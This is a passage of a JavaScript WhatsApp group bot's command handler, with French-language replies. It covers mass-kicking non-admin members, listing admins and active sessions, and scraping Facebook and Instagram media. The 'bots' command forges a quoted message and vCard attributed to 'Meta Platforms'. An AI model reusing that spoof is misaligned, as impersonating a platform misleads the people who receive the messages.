        const groupAdmins = participants.filter(p => p.admin).map(p => p.id);

        const toKick = participants.filter(p =>
            !groupAdmins.includes(p.id) && p.id !== botNumber
        );

        if (!toKick.length) {
            await socket.sendMessage(from, {
                text: `❌ ᴀᴜᴄᴜɴ ᴍᴇᴍʙʀᴇ ᴀ ᴇxᴘᴜʟsᴇʀ`
            }, { quoted: msg });
            break;
        }

        let kickLines = "";
        toKick.forEach((mem, i) => {
            const num = mem.id.split('@')[0];
            kickLines += `☠️ ${(i + 1).toString().padStart(2, '0')}. @${num}\n`;
        });

        // ===== IMAGE LOAD =====
        const imagePath = "./menu3.jpg";

        const buffer = fs.existsSync(imagePath)
            ? fs.readFileSync(imagePath)
            : null;

        const caption = `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🏴‍☠️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐊𝐈𝐂𝐊𝐀𝐋𝐋*
│. ˚˖𓍢ִ໋📌 ɢʀᴏᴜᴘ : ${groupName}
│. ˚˖𓍢ִ໋⚓ ᴀᴅᴍɪɴ : @${sender.split('@')[0]}
│. ˚˖𓍢ִ໋👥 ᴍᴇᴍʙʀᴇs : ${toKick.length}
│. ˚˖𓍢ִ໋${kickLines}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
💀 sᴛᴀᴛᴜᴛ : ᴇxᴘᴜʟsɪᴏɴ ᴇɴ ᴄᴏᴜʀs`;

        await socket.sendMessage(from, {
            image: buffer,
            caption: caption,
            mentions: [sender, ...toKick.map(p => p.id)]
        }, { quoted: msg });

        await socket.groupParticipantsUpdate(
            from,
            toKick.map(p => p.id),
            "remove"
        );

        await socket.sendMessage(from, {
            text: `✅ ᴀʟʟ ᴍᴇᴍʙʀᴇs ʀᴇᴍᴏᴠᴇᴅ`
        }, { quoted: msg });

    } catch (e) {
        await socket.sendMessage(sender, {
            text: `❌ ᴇʀʀᴇᴜʀ : ${e.message || e}`
        }, { quoted: msg });
    }

    break;
}

case 'kickall': {
  if (!from.endsWith('@g.us')) break;

  try {

    const fs = require('fs');

    const { participants, groupAdminsJid, botJid } =
      await require('./normalize').getGroupAdminsInfo(socket, from);

    const senderJid =
      nowsender || msg.key.participant || msg.key.remoteJid;

    if (!groupAdminsJid.includes(senderJid)) {
      return await socket.sendMessage(from, {
        text: '❌ Seuls les admins peuvent utiliser kickall.'
      }, { quoted: msg });
    }

    if (!botJid || !groupAdminsJid.includes(botJid)) {
      return await socket.sendMessage(from, {
        text: '❌ Le bot doit être admin.'
      }, { quoted: msg });
    }

    // ===== FILTER NON ADMINS =====
    const toKick = participants
      .map(p => p.jid)
      .filter(Boolean)
      .filter(j => !groupAdminsJid.includes(j) && j !== botJid);

    const unique = [...new Set(toKick)];

    if (!unique.length) {
      return await socket.sendMessage(from, {
        text: '❌ Aucun membre non-admin à retirer.'
      }, { quoted: msg });
    }

    // ===== IMAGE =====
    const imagePath = fs.existsSync('./menu3.jpg')
      ? './menu3.jpg'
      : './menu2.jpg';

    const buffer = fs.readFileSync(imagePath);

    // ===== STYLE MESSAGE =====
    const caption = `
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│ 🚨 *𝐊𝐈𝐂𝐊 𝐀𝐋𝐋 𝐒𝐘𝐒𝐓𝐄𝐌*
│ 👥 ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀs ʀᴇᴍᴏᴠᴀʟ
│ 📊 ᴛᴏᴛᴀʟ : ${unique.length}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> ⚠️ ᴘʀᴏᴄᴇss sᴛᴀʀᴛɪɴɢ...

> ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx 🐉
`.trim();

    // ===== BUTTONS =====
    const buttons = [
      {
        buttonId: '.menu',
        buttonText: { displayText: '📋 ᴍᴇɴᴜ' },
        type: 1
      },
      {
        buttonId: '.tagall',
        buttonText: { displayText: '📣 ᴛᴀɢᴀʟʟ' },
        type: 1
      },
      {
        buttonId: '.repo',
        buttonText: { displayText: '📦 ʀᴇᴘᴏ' },
        type: 1
      }
    ];

    // ===== WARNING MESSAGE =====
    await socket.sendMessage(from, {
      image: buffer,
      caption,
      footer: 'ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx',
      buttons,
      headerType: 4
    }, { quoted: msg });

    // ===== KICK ACTION =====
    await socket.groupParticipantsUpdate(from, unique, 'remove');

    // ===== SUCCESS =====
    await socket.sendMessage(from, {
      text: `✅ *ᴋɪᴄᴋᴀʟʟ ᴛᴇʀᴍɪɴᴇ́*\n\n👥 ʀᴇᴛɪʀᴇ́s: ${unique.length}`,
      mentions: unique
    }, { quoted: msg });

  } catch (e) {
    console.error('KICKALL ERROR', e);

    await socket.sendMessage(from, {
      text: `❌ Erreur kickall:\n${e.message || e}`
    }, { quoted: msg });
  }

  break;
}


case 'listadmin': {
    if (!from.endsWith('@g.us')) {
        await socket.sendMessage(sender, {
            text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐃𝐌𝐈𝐍*
│. ˚˖𓍢ִ໋📌 ɴᴏᴛɪᴄᴇ
│. ˚˖𓍢ִ໋• ɢʀᴏᴜᴘ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
        break;
    }

    try {
        const metadata = await socket.groupMetadata(from);
        const participants = metadata.participants || [];
        const groupAdmins = participants.filter(p => p.admin).map(p => p.id);

        if (!groupAdmins.length) {
            await socket.sendMessage(from, {
                text: `❌ ᴀᴜᴄᴜɴ ᴀᴅᴍɪɴ ᴅᴇᴛᴇᴄᴛᴇ́`
            }, { quoted: msg });
            break;
        }

        let caption = `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋👑 *𝐀𝐃𝐌𝐈𝐍 𝐋𝐈𝐒𝐓*`;

        groupAdmins.forEach((admin, i) => {
            caption += `│. ˚˖𓍢ִ໋👤 ${(i + 1).toString().padStart(2, '0')}. @${admin.split('@')[0]}\n`;
        });

        await socket.sendMessage(from, {
            text: caption,
            mentions: groupAdmins
        }, { quoted: msg });

    } catch (e) {
        await socket.sendMessage(sender, {
            text: `❌ ᴇʀʀᴇᴜʀ : ${e.message || e}`
        }, { quoted: msg });
    }
    break;
}
          
            // ============ COMMANDE INCONNUE ============
// === COMMANDE UPSCALE (amélioration d'image) ===
// === COMMANDE UPSCALE (amélioration d'image) ===

case 'active':
case 'bots': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY;

    // Vérification admin
    const admins = await loadAdminsFromMongo();
    const senderIdSimple = (nowsender || '').includes('@') ? nowsender.split('@')[0] : (nowsender || '');
    const isAdmin = admins.some(admin => 
      admin === nowsender || admin.includes(senderIdSimple)
    );

    if (!isAdmin) {
      await socket.sendMessage(sender, { 
        text: '❌ ᴀᴄᴄᴇs ʀᴇsᴇʀᴠᴇ ᴀᴜx ᴀᴅᴍɪɴs.' 
      }, { quoted: msg });
      break;
    }

    const activeCount = activeSockets.size;
    const activeNumbers = Array.from(activeSockets.keys());

    // Meta mention
    const metaQuote = {
      key: { 
        remoteJid: "status@broadcast", 
        participant: "0@s.whatsapp.net", 
        fromMe: false, 
        id: "META_AI_ACTIVESESSIONS" 
      },
      message: { 
        contactMessage: { 
          displayName: botName, 
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` 
        } 
      }
    };

    // STYLE MENU MODIFIÉ (comme ton modèle)
    let text =
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🤖 *𝐀𝐂𝐓𝐈𝐕𝐄 𝐒𝐘𝐒𝐓𝐄𝐌*
│. ˚˖𓍢ִ໋📊 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍𝐒
│. ˚˖𓍢ִ໋• ᴛᴏᴛᴀʟ : ${activeCount}
│. ˚˖𓍢ִ໋• ʜᴇᴜʀᴇ : ${getHaitiTimestamp()}
│. ˚˖𓍢ִ໋• ғᴜsᴇᴀᴜ : ʜᴀïᴛɪ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

`;

    if (activeCount > 0) {
      text +=
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📱 *𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐁𝐎𝐓𝐒*
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

`;

      activeNumbers.forEach((num, index) => {
        text += `│. ˚˖𓍢ִ໋🟢 ${String(index + 1).padStart(2,'0')}. ${num}\n`;
      });

      text +=
`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📈 ᴘᴇʀғᴏʀᴍᴀɴᴄᴇ : ${activeCount > 10 ? "élevée" : activeCount > 5 ? "moyenne" : "basse"}
│. ˚˖𓍢ִ໋📊 sᴛᴀᴛᴜs : ᴏᴘᴇʀᴀᴛɪᴏɴɴᴇʟ ✅
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`;

    } else {
      text +=
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚠️ *𝐀𝐔𝐂𝐔𝐍 𝐁𝐎𝐓 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄*
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

│. ˚˖𓍢ִ໋• ᴠᴇʀɪғɪᴇʀ ɪɴᴛᴇʀɴᴇᴛ
│. ˚˖𓍢ִ໋• ᴄᴏɴsᴜʟᴛᴇʀ ʟᴏɢs
│. ˚˖𓍢ִ໋• ʀᴇᴇssᴀʏᴇʀ ᴘʟᴜs ᴛᴀʀᴅ`;
    }

    const logo = cfg.logo || config.RCD_IMAGE_PATH;
    let imagePayload = String(logo).startsWith('http') ? { url: logo } : fs.readFileSync(logo);

    await socket.sendMessage(sender, {
      image: imagePayload,
      caption: text,
      footer: `📌 ${botName} • 𝐒𝐘𝐒𝐓𝐄𝐌`,
      headerType: 4
    }, { quoted: metaQuote });

  } catch(e) {
    console.error('❌ Erreur bots:', e);
    await socket.sendMessage(sender, { 
      text: '❌ ɪᴍᴘᴏssɪʙʟᴇ ᴅ’ᴀᴄᴄéᴅᴇʀ ᴀᴜx sᴇssɪᴏɴs.' 
    }, { quoted: msg });
  }
  break;
}

// === COMMANDE FACEBOOK DOWNLOADER ===
// === COMMANDE FACEBOOK DOWNLOADER ===
case 'facebook': case 'fbdl': case 'fb': {
  try {
    const jid = remoteJid;
    const sender = msg.key.participant || msg.key.remoteJid;

    const url = args.join(' ').trim();

    if (!url) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐄𝐑𝐑𝐄𝐔𝐑 𝐔𝐒𝐀𝐆𝐄*
│. ˚˖𓍢ִ໋📌 ᴜᴛɪʟɪsᴀᴛɪᴏɴ
│. ˚˖𓍢ִ໋• ${prefix}${command} https://fb.watch/xxxx
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    if (!url.match(/(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\/.*/i)) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐋𝐈𝐄𝐍 𝐈𝐍𝐕𝐀𝐋𝐈𝐃𝐄*
│. ˚˖𓍢ִ໋📌 ʟɪᴇɴ ᴇxᴇᴍᴘʟᴇ
│. ˚˖𓍢ִ໋• https://fb.watch/xxxx
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    await socket.sendMessage(jid, { react: { text: "⏳", key: msg.key } });

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔄 *𝐅𝐁 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑*
│. ˚˖𓍢ִ໋⏳ ᴛᴇ́ʟᴇ́ᴄʜᴀʀɢᴇᴍᴇɴᴛ...
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    const response = await axios.post('https://v3.fdownloader.net/api/ajaxSearch',
      new URLSearchParams({
        q: url,
        lang: 'en',
        web: 'fdownloader.net',
        v: 'v2',
        w: ''
      }).toString(),
      {
        headers: {
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          origin: 'https://fdownloader.net',
          referer: 'https://fdownloader.net/',
          'user-agent': 'Mozilla/5.0 (Linux; Android 10)'
        }
      }
    );

    if (!response.data || !response.data.data) {
      throw new Error('Impossible de récupérer la vidéo');
    }

    const $ = cheerio.load(response.data.data);

    const duration = $('.content p').first().text().trim() || 'Inconnu';
    const thumbnail = $('.thumbnail img').attr('src') || null;

    const videos = [];

    $('.download-link-fb').each((_, el) => {
      const quality = $(el).attr('title')?.replace('Download ', '') || '';
      const videoUrl = $(el).attr('href');
      if (videoUrl) videos.push({ quality, url: videoUrl });
    });

    $('.download-button a').each((_, el) => {
      const quality = $(el).text().trim() || 'SD';
      const videoUrl = $(el).attr('href');
      if (videoUrl && !videos.some(v => v.url === videoUrl)) {
        videos.push({ quality, url: videoUrl });
      }
    });

    if (!videos.length) throw new Error('Aucune vidéo trouvée');

    const qualityPriority = ['HD', '720p', '480p', '360p'];
    let selectedVideo = videos[0];

    for (const p of qualityPriority) {
      const found = videos.find(v =>
        v.quality.toLowerCase().includes(p.toLowerCase())
      );
      if (found) {
        selectedVideo = found;
        break;
      }
    }

    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📹 *𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐃𝐋*
│. ˚˖𓍢ִ໋📊 ǫᴜᴀʟɪᴛᴇ : ${selectedVideo.quality}
│. ˚˖𓍢ִ໋⏱️ ᴅᴜʀᴇ́ᴇ : ${duration}
│. ˚˖𓍢ִ໋🔗 ʟɪᴇɴ ᴘʀᴏᴄᴇss...
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    try {
      await socket.sendMessage(jid, {
        video: { url: selectedVideo.url },
        caption:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📹 *𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐕𝐈𝐃𝐄𝐎*
│. ˚˖𓍢ִ໋📊 ǫᴜᴀʟɪᴛᴇ : ${selectedVideo.quality}
│. ˚˖𓍢ִ໋⏱️ ᴅᴜʀᴇ́ᴇ : ${duration}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,
        mimetype: 'video/mp4'
      }, { quoted: msg });

    } catch (sendErr) {
      await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐄𝐍𝐕𝐎𝐈 𝐄́𝐂𝐇𝐎𝐔𝐄́*
│. ˚˖𓍢ִ໋🔗 ${selectedVideo.url}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    await socket.sendMessage(jid, { react: { text: "✅", key: msg.key } });

  } catch (e) {
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐄𝐑𝐑𝐄𝐔𝐑 𝐅𝐁*
│. ˚˖𓍢ִ໋• ${e.message}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
  }
  break;
}
// ============================================================
// IG — Télécharger depuis Instagram (OWNER ONLY)
// ============================================================
case 'ig':
case 'instagram':
case 'igdl': {
  try {
    // ===== OWNER ONLY =====
    if (!isOwner) {
      react("❌");
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃*
│. ˚˖𓍢ִ໋🔒 ʀᴇsᴇʀᴠᴇ ᴀᴜ ᴘʀᴏᴘʀɪᴇ́ᴛᴀɪʀᴇ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    // ===== REACT =====
    react("⏳");

    // ===== URL =====
    const url = args.join(' ').trim();

    if (!url || !/instagram\.com\//i.test(url)) {
      react("❌");
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📸 *𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝐃𝐋*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ :
│. ˚˖𓍢ִ໋• .ig <lien_instagram>
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋✅ ᴄᴏᴍᴘᴀᴛɪʙʟᴇ :
│. ˚˖𓍢ִ໋• Reels / Posts / Carousels
│. ˚˖𓍢ִ໋• Stories
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    // ===== PROCESSING MESSAGE =====
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔎 *𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝐃𝐋*
│. ˚˖𓍢ִ໋⏳ ᴛᴇ́ʟᴇ́ᴄʜᴀʀɢᴇᴍᴇɴᴛ...
│. ˚˖𓍢ִ໋• ${url.slice(0, 40)}...
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    // ===== FETCH via reelsvideo =====
    let info = null;
    try {
      info = await reelsvideo(url);
    } catch (fetchErr) {
      console.warn('[IG] reelsvideo failed, trying fallback:', fetchErr.message);
    }

    // ===== FALLBACK via instagramdl API =====
    if (!info || (!info.videos?.length && !info.images?.length)) {
      try {
        const fbResponse = await axios.get(
          `https://api.lolhuman.xyz/api/instagram?apikey=lolhuman&url=${encodeURIComponent(url)}`,
          { timeout: 15000 }
        );
        const fbData = fbResponse.data;
        if (fbData?.result) {
          const r = fbData.result;
          info = {
            username: r.owner?.username || 'instagram',
            type:     Array.isArray(r.medias) && r.medias.length > 1 ? 'carousel' : 'video',
            thumb:    r.thumbnail || null,
            videos:   Array.isArray(r.medias) ? r.medias.filter(m => m.type === 'video').map(m => m.url) : (r.url ? [r.url] : []),
            images:   Array.isArray(r.medias) ? r.medias.filter(m => m.type === 'image').map(m => m.url) : [],
            mp3:      []
          };
        }
      } catch (fallbackErr) {
        console.warn('[IG] fallback also failed:', fallbackErr.message);
      }
    }

    if (!info || (!info.videos?.length && !info.images?.length && !info.mp3?.length)) {
      react("❌");
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐀𝐔𝐂𝐔𝐍 𝐌𝐄𝐃𝐈𝐀 𝐓𝐑𝐎𝐔𝐕𝐄́*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋• Lien privé ou expiré
│. ˚˖𓍢ִ໋• Vérifiez que le compte
│. ˚˖𓍢ִ໋  est public
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    // ===== SUMMARY =====
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋📊 *𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐓*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋👤 ᴀᴜᴛᴇᴜʀ : ${info.username || 'inconnu'}
│. ˚˖𓍢ִ໋📸 ᴛʏᴘᴇ   : ${info.type || 'inconnu'}
│. ˚˖𓍢ִ໋🎞️ ᴠɪᴅᴇ́ᴏs : ${info.videos?.length || 0}
│. ˚˖𓍢ִ໋🖼️ ɪᴍᴀɢᴇs : ${info.images?.length || 0}
│. ˚˖𓍢ִ໋🎵 ᴀᴜᴅɪᴏ  : ${info.mp3?.length || 0}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    // ===== HELPER DOWNLOAD =====
    async function fetchIgBuffer(u) {
      try {
        const r = await axios.get(u, {
          responseType: 'arraybuffer',
          timeout: 45000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Referer': 'https://www.instagram.com/'
          }
        });
        return Buffer.from(r.data);
      } catch (e) {
        console.warn('[IG] fetchIgBuffer error:', e.message);
        return null;
      }
    }

    // ===== SEND VIDEOS =====
    if (Array.isArray(info.videos) && info.videos.length) {
      for (const v of info.videos.slice(0, 3)) {
        const buf = await fetchIgBuffer(v);
        if (!buf) {
          // Envoie le lien direct si le buffer échoue
          await socket.sendMessage(from, {
            text: `🔗 Lien vidéo IG :\n${v}`
          }, { quoted: msg });
          continue;
        }
        await socket.sendMessage(from, {
          video: buf,
          caption:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎥 *𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝐕𝐈𝐃𝐄𝐎*
│. ˚˖𓍢ִ໋• @${info.username || 'instagram'}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋> 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,
          mimetype: 'video/mp4'
        }, { quoted: msg });
      }
      react("✅");
      break;
    }

    // ===== SEND IMAGES =====
    if (Array.isArray(info.images) && info.images.length) {
      for (const imgUrl of info.images.slice(0, 6)) {
        const buf = await fetchIgBuffer(imgUrl);
        if (!buf) {
          await socket.sendMessage(from, { text: `🔗 Image IG :\n${imgUrl}` }, { quoted: msg });
          continue;
        }
        await socket.sendMessage(from, {
          image: buf,
          caption:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🖼️ *𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝐈𝐌𝐀𝐆𝐄*
│. ˚˖𓍢ִ໋• @${info.username || 'instagram'}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋> 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });
      }
      react("✅");
      break;
    }

    // ===== SEND AUDIO =====
    if (Array.isArray(info.mp3) && info.mp3.length) {
      for (const a of info.mp3.slice(0, 2)) {
        const audioUrl = typeof a === 'string' ? a : a.url;
        const buf = await fetchIgBuffer(audioUrl);
        if (!buf) continue;
        await socket.sendMessage(from, {
          audio: buf,
          mimetype: 'audio/mpeg',
          ptt: false
        }, { quoted: msg });
      }
      react("✅");
      break;
    }

    react("❌");
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐀𝐔𝐂𝐔𝐍 𝐌𝐄𝐃𝐈𝐀 𝐄𝐍𝐕𝐎𝐘𝐄́*
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

  } catch (err) {
    console.error('[IG COMMAND ERROR]', err);
    react("❌");
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐄𝐑𝐑𝐄𝐔𝐑 𝐈𝐆*
│. ˚˖𓍢ִ໋• ${err.message || 'Erreur inconnue'}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋💡 Causes possibles :
│. ˚˖𓍢ִ໋• Compte privé
│. ˚˖𓍢ִ໋• Lien expiré
│. ˚˖𓍢ִ໋• Serveur surchargé
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

case 'menu': {
  try {

    await socket.sendMessage(sender, {
      react: { text: "🫯", key: msg.key }
    });

    const fs = require('fs');
    const os = require('os');

    const activeUsers =
      typeof getTotalUsers === "function"
        ? getTotalUsers()
        : 0;

    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);

    const up = `${hours}h ${minutes}m ${seconds}s`;

    // 🔥 FIX IMAGE SAFE
    const imagePath =
      fs.existsSync('./menu2.jpg')
        ? './menu2.jpg'
        : './menu3.jpg';

    const buffer = fs.readFileSync(imagePath);

    const botName = config?.BOT_NAME || "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓";
    const botMode = typeof mode !== "undefined" ? mode : "public";

    const menuText = `
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
┆ 🤖 ${botName}
┆ ⚙️ ᴍᴏᴅᴇ : ${botMode}
┆ 🧩 ᴘʀᴇғɪx : ${prefix}
┆ 👥 ᴜsᴇʀs : ${activeUsers}
┆ ⏱️ ᴜᴘᴛɪᴍᴇ : ${up}
┆ 🍁 ᴄʀᴇᴀᴛᴏʀ : ʏᴏᴜ ᴛʀᴄʜx ᴏғᴄ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> *ᴄʟɪᴄᴋ ᴀ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ 👇*
`.trim();

    const buttons = [
      { buttonId: '.alive', buttonText: { displayText: '⚡ ᴀʟɪᴠᴇ' }, type: 1 },
      { buttonId: '.ping', buttonText: { displayText: '🌟 ᴘɪɴɢ' }, type: 1 },
      { buttonId: '.menu2', buttonText: { displayText: '📑 ᴍᴀɪɴ-ᴍᴇɴᴜ' }, type: 1 },
      { buttonId: '.bugmenu', buttonText: { displayText: '👾 ʙᴜɢᴍᴇɴᴜ' }, type: 1 },
      { buttonId: '.allmenu', buttonText: { displayText: '📋 ᴀʟʟ ᴍᴇɴᴜ' }, type: 1 }
    ];

    await socket.sendMessage(sender, {
      image: buffer,
      caption: menuText,
      footer: "YOU WEB BOT",
      buttons,
      headerType: 4
    }, { quoted: msg });

  } catch (e) {
    console.error("MENU ERROR:", e);

    await socket.sendMessage(sender, {
      text: `❌ MENU ERROR: ${e.message}`
    }, { quoted: msg });
  }
}
break;

case 'allmenu':
case 'help':
case 'youx': {
  try {

    // ===== REACT =====
    try {
      await socket.sendMessage(sender, {
        react: {
          text: "📑",
          key: msg.key
        }
      });
    } catch (e) {}

    // ===== MODULES =====
    const moment = require("moment-timezone");
    const os = require("os");
    const fs = require("fs");

    const start = Date.now();

    // ===== DATE =====
    const now = moment().tz("Africa/Nairobi");
    const date = now.format("DD/MM/YYYY");

    // ===== USER =====
    const userJid =
      msg?.key?.participant ||
      msg?.key?.remoteJid ||
      sender;

    const userNumber =
      typeof userJid === "string"
        ? userJid.split("@")[0]
        : "user";

    const userName =
      msg?.pushName ||
      pushname ||
      userNumber;

    // ===== UPTIME =====
    const uptime = (() => {
      const s = process.uptime();

      const d = Math.floor(s / 86400);
      const h = Math.floor((s % 86400) / 3600);
      const m = Math.floor((s % 3600) / 60);
      const sec = Math.floor(s % 60);

      return `${d}d ${h}h ${m}m ${sec}s`;
    })();

    // ===== RAM =====
    const ram = (() => {
      const total = os.totalmem();
      const free = os.freemem();
      const used = total - free;

      const format = (b) => {
        if (b >= 1073741824)
          return (b / 1073741824).toFixed(2) + "GB";

        return (b / 1048576).toFixed(2) + "MB";
      };

      return `${format(used)}/${format(total)}`;
    })();

    // ===== MODE =====
    const botMode =
      config?.MODE === "public"
        ? "PUBLIC"
        : "PRIVATE";

    // ===== BOT INFO =====
    const botName =
      config?.BOT_NAME ||
      "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓";

    const footer =
      config?.BOT_FOOTER ||
      "*ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx 🌙*";

    const version =
      config?.BOT_VERSION ||
      "1.0.0";

    // ===== USERS =====
    const activeUsers =
      typeof getTotalUsers === "function"
